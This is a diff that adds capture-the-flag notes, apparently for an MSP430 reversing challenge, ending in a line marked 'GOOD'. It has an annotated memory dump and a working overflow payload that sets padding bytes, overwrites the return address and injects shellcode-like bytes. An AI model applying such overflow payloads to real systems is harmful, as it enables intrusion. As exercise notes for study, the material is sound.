@@ -1,0 +1,25 @@
+4390:   0000 d846 0300 4c47 0000 0a00 0000 d045   ...F..LG.......E
+43a0:   0000 4141 4141 4141 4141 4141 4141 4141   ..AAAAAAAAAAAAAA
+43b0:   4141 0707 0e5a 5a5a 5a5a 5a5a 5a5a 5a5a   AA...ZZZZZZZZZZZ
+               |  |
+               2  1
+
+#17 + \0
+
+43c0:   5a5a 5a5a 5a5a 5a5a 5a5a 5a5a 5a5a 5a5a   ZZZZZZZZZZZZZZZZ
+                       |              |
+                       3              pc
+
+43d0:   5a5a 5a5a 5a5a 5a5a 5a5a 5a5a 5a5a 5a5a   ZZZZZZZZZZZZZZZZ
+43e0:   5a5a 5a5a 5a5a 5a5a 5a5a 5a5a 5a5a 5a5a   ZZZZZZZZZZZZZZZZ
+43f0:   5a5a 5a5a 5a5a 5a5a 5a5a 5a5a 5a5a 5a5a   ZZZZZZZZZZZZZZZZ
+
+1:  0x43b4 <= 1st var less than
+2:  0x43b3 <= 2nd var greater than
+3:  0x43c6 <= 3rd var flag == 0
+
+
+# GOOD
+
+"Z" * 17
+"41" * 17 + "07" + "12" + "42" * 23 + "CE43" +  "3f40ff013f8080010f12b012c446" + "33" * 161
